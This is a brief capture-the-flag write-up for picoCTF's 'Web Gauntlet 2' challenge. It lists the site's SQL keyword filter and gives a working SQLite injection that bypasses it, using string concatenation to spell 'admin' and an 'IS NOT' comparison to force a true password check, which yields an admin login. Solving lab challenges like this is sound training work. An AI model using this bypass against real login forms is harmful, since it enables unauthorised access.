# CTF-Documentation
# CTF Name : pico ctf
# Category : web exploitation
# Challenge Name : Web Gauntlet 2
# Description 
This website looks familiar...

# Discover
we see login page 
<img width="1599" height="777" alt="1login" src="https://github.com/user-attachments/assets/dc4fbda5-db01-4d95-b76b-919018d05d45" />
and hint 5 says sql lite must be injection but filter is block us from injection
<img width="1597" height="780" alt="1" src="https://github.com/user-attachments/assets/02b7b38d-df79-4d61-bcce-16c8087cc0c7" />
Filters: or and true false union like = > < ; -- /* */ admin 
# exploit
to baypass filter let's craft payload
username is admin but filter block us so we need to write 
adm'||'in
and password we need to do true value 
a'IS NOT 'b

    username : adm'||'in
    password : a'IS NOT 'b

and after we input payload we get this 
<img width="1549" height="779" alt="4" src="https://github.com/user-attachments/assets/4793bb1f-2a45-4686-a32d-c4b1f417d4cb" />
and to get flag we need to go end point filter.php
<img width="1599" height="782" alt="3" src="https://github.com/user-attachments/assets/109d3395-7fb0-41f8-adf2-377ad475e90c" />
get flag!



